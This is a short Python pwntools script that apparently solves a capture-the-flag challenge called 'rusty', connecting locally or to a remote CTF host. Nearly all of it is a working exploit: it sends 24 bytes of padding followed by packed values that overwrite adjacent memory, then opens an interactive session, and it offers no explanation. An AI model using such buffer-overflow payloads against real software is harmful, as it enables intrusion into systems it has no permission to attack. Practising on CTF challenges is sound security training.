#!/usr/bin/python3

from pwn import *

exe = ELF('rusty', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*0x55555555c66a

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('challs.tfcctf.com', 30245)
else:
        p = process(exe.path)

GDB()
sl(b"a" * 24 +p64(0x21) + p32(0x72656854) + p32(0x65))
p.interactive()
